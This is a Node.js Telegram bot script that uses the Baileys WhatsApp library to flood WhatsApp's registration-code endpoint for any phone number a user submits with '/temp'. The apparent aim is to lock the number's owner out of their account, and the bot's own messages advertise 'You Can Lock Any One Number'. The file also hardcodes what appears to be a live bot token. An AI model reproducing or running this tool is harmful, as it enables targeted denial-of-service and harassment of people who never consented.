const keepAlive = require('./keep_alive.js');
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { promisify } = require('util');
const readdir = promisify(fs.readdir);
const readFile = promisify(fs.readFile);
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('number.json'));
const usedTempCommandUsers = JSON.parse(fs.readFileSync('used_temp_command_users.json', 'utf8') || '[]');

// Replace with your bot token from BotFather
const botToken = '7480350575:AAF7TZv9j98gtrwdmK5ErQe19IhVrGNOy3I';
// Replace with your channel usernames or IDs
const channelId1 = '@TeAm_Ali_1';
const channelId2 = '@artificial_aishuuu';

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.mm');
  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }),
  });

  console.clear();

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        const res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 666,
        });
        const b = res.reason === 'temporarily_unavailable';
        if (b) {
          console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
          setTimeout(async () => {
            dropNumber(context);
          }, res.retry_after * 3600 * 1000);
          return;
        }
      } catch (error) {
        console.log(error);
      }
    }
  };

  const bot = new TelegramBot(botToken, { polling: true });

  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const options = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Button 1', url: 'https://t.me/TeAm_Ali_1' },
            { text: 'Button 2', url: 'https://t.me/artificial_aishuuu' }
          ],
          [
            { text: 'Check Join', callback_data: 'check_join' }
          ]
        ]
      }
    };

    bot.sendMessage(chatId, 'this bot is working free servers may be some time not working \nif you want to buy paid bot then contect : @XD_insan', options);
  });

  bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;

    if (callbackQuery.data === 'check_join') {
      try {
        const response1 = await axios.get(`https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelId1}&user_id=${userId}`);
        const response2 = await axios.get(`https://api.telegram.org/bot${botToken}/getChatMember?chat_id=${channelId2}&user_id=${userId}`);

        const userStatus1 = response1.data.result.status;
        const userStatus2 = response2.data.result.status;

        if (
          (userStatus1 === 'member' || userStatus1 === 'administrator' || userStatus1 === 'creator') &&
          (userStatus2 === 'member' || userStatus2 === 'administrator' || userStatus2 === 'creator')
        ) {
          bot.sendMessage(chatId, '```30mint_locker You Can Lock Any One Number\nLock cmd /temp 92/number```', {
            parse_mode: 'Markdown',
            reply_to_message_id: callbackQuery.message.message_id,
          });

          bot.onText(/\/temp (.+)/, (msg, match) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            if (usedTempCommandUsers.includes(userId)) {
              bot.sendMessage(chatId, 'YOU USED ONE TIME NO MORE TRY YOU HAVE IF YOU WANT TO BUY THEN CONTECT @XD_insan.');
              return;
            }

            if (!match[1]) {
              bot.sendMessage(chatId, 'ENTER VALID NUMBER DETAILS.');
              return;
            }

            const input = match[1].split('/');
            const ddi = input[0];
            const number = input[1];

            if (!ddi || !number) {
              bot.sendMessage(chatId, 'ENTER VALID NUMBER.');
              return;
            }

            const phoneNumber = ddi + number;
            numbers[phoneNumber] = { ddi, number };
            fs.writeFileSync('number.json', JSON.stringify(numbers, null, '\t'));
            dropNumber({ phoneNumber, ddi, number });

            usedTempCommandUsers.push(userId);
            fs.writeFileSync('used_temp_command_users.json', JSON.stringify(usedTempCommandUsers, null, '\t'));

            const caption = `\`\`\`LOCKED_SUCCESSFULY:+${phoneNumber}\`\`\``;

            bot.sendMessage(chatId, caption, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
          });

        } else {
          bot.sendMessage(chatId, 'Please join both channels first.');
        }
      } catch (error) {
        bot.sendMessage(chatId, 'An error occurred while checking the membership status.');
      }
    }
  });

  console.log('Bot is running...');
};

start();
        
